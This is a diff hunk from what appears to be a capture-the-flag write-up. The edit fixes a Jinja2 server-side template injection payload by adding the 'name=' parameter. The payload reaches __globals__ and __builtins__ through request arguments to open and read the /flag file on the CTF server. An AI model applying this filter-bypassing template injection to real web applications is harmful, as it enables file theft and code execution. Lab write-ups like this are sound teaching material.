@@ -74,7 +74,7 @@ open() with paramerter __flag__
 
 And putting the whole payload together:
 
-`http://ctf-league.osusec.org:31311/?{{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}&param1=__globals__&param2=__builtins__&param3=/flag`  
+`http://ctf-league.osusec.org:31311/?name={{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}&param1=__globals__&param2=__builtins__&param3=/flag`  
 
 We get the flag!
 
